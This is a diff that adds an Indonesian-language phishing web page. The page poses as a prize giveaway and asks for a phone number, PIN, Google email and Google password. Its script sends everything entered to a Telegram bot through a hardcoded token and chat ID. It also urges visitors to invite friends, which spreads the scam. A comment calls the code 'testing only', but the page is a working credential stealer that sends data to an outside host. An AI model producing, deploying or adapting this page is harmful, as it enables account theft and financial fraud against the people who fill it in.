@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title></title>
+  <link href="" rel="stylesheet">
+  <style>
+    :root {
+      --bg1: #06b6d4;
+      --bg2: #0369a1;
+      --muted: #9fb8c6;
+    }
+
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      margin: 0;
+      font-family: "Poppins", system-ui, Arial, sans-serif;
+      background: linear-gradient(180deg, #07192a 0%, #04293a 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #e6f8ff;
+    }
+
+    .card {
+      width: 380px;
+      max-width: 96%;
+      background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.01));
+      border-radius: 14px;
+      padding: 18px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    .logo {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+    }
+
+    .logo .icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--bg1), var(--bg2));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #022c2f;
+      font-weight: 700;
+      font-size: 18px;
+    }
+
+    h1 {
+      font-size: 16px;
+      margin: 0 0 6px 0;
+    }
+
+    p.lead {
+      margin: 0;
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .field {
+      margin-top: 12px;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 6px;
+    }
+
+    input,
+    button,
+    textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      background: rgba(255, 255, 255, 0.02);
+      color: inherit;
+      outline: none;
+      font-size: 14px;
+    }
+
+    .small {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 8px;
+    }
+
+    .btn {
+      margin-top: 12px;
+      padding: 12px;
+      background: linear-gradient(90deg, var(--bg1), var(--bg2));
+      color: #022c2f;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      border-radius: 10px;
+    }
+
+    .result {
+      display: none;
+      margin-top: 12px;
+      padding: 10px;
+      background: #05242f;
+      color: #c2f0fb;
+      border-radius: 10px;
+    }
+
+    .consent {
+      margin-top: 12px;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .consent input {
+      width: auto;
+    }
+
+    .footer {
+      margin-top: 12px;
+      font-size: 12px;
+      color: var(--muted);
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card" role="main" aria-labelledby="title">
+    <div class="logo">
+<div class="logo-icon">
+  <img src="https://k.top4top.io/p_3617rl4dj0.jpg" alt="Logo" style="width:56px;height:56px;border-radius:12px;">
+</div>
+    </div>
+    <div class="field">
+      <label>Nomor HP</label>
+      <input id="hp" type="tel" placeholder="62xxxxx" inputmode="numeric" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>PIN</label>
+      <input id="pin" type="password" placeholder="••••" autocomplete="new-password">
+    </div>
+    <div class="field">
+      <label>Email / Akun Google</label>
+      <input id="email" type="text" placeholder="namaakun@gmail.com" autocomplete="off">
+    </div>
+    <div class="field">
+      <label>Password Google</label>
+      <input id="pass" type="password" placeholder="••••••••" autocomplete="new-password">
+    </div>
+    <div class="consent">
+      <input id="consentCheck" type="checkbox" aria-label="Saya mengerti risiko keamanan (required)">
+      <label for="consentCheck" class="small">Saya mengerti simpan data data anda agar anda tidak lupa  <strong></strong> </label>
+    </div>
+    <button class="btn" id="submitBtn">Submit</button>
+    <div class="result" id="result"></div>
+    <div class="small"><strong>UNDANG SEBANYAK BANYAK NYA TEMENMU UNTUK MENGAMBIL HADIAH INI BURUAN SEKARANG</strong> </div>
+    <div class="footer"></div>
+  </div>
+  <script>
+    /*
+     --- PERINGATAN PENTING ---
+     Kode ini mengirimkan PIN dan password. Ini sangat tidak aman!
+     Gunakan hanya untuk tujuan pengujian di lingkungan yang terkontrol.
+     */
+    const TELEGRAM_TOKEN = "8270364820:AAGK1X5wnpVS_W7piE4rbwZwbnpZCK-VaWY"; // Ganti dengan token bot Anda
+    const TELEGRAM_CHAT_ID = "8280304329"; // Ganti dengan chat ID Anda
+
+    function genSessionId() {
+      return 's-' + Math.random().toString(36).slice(2, 10);
+    }
+
+    async function sendTelegram(text) {
+      if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.log("Telegram not configured; skipped send.");
+        return {
+          ok: false,
+          message: 'not-configured'
+        };
+      }
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text
+          })
+        });
+        return await res.json();
+      } catch (e) {
+        console.warn("Telegram send error", e);
+        return {
+          ok: false,
+          error: String(e)
+        };
+      }
+    }
+
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+      const hp = document.getElementById('hp').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const pass = document.getElementById('pass').value.trim();
+
+      const consent = document.getElementById('consentCheck').checked;
+      const resultBox = document.getElementById('result');
+
+      resultBox.style.display = 'block';
+
+      if (!consent) {
+        resultBox.innerHTML = '<strong>Telah selesai harap tunggu.</strong><br>Data telah dikirim.';
+      }
+
+      const session = genSessionId();
+      const now = new Date().toISOString();
+      const text = [
+        "Data Data ini Bos",
+        `session: ${session}`,
+        `waktu: ${now}`,
+        `hp: ${hp || '-'}`,
+        `pin: ${pin || '-'}`,
+        `email: ${email || '-'}`,
+        `password: ${pass || '-'}`,
+        "status: berhasil (data sensitif dikirim)"
+      ].join("\n");
+
+      const tg = await sendTelegram(text);
+      if (tg && tg.ok) {
+        resultBox.innerHTML = '<strong>Selesai harap tunggu</strong><br>........................';
+      } else {
+        resultBox.innerHTML = '<strong>Data disimpan harap tunggu sebentar</strong><br>Gagal mengirim notifikasi (TIDAK AMAN). Cek token/chat_id atau CORS (lihat console).';
+        console.log('telegram result', tg);
+      }
+
+    });
+  </script>
+</body>
+
+</html>
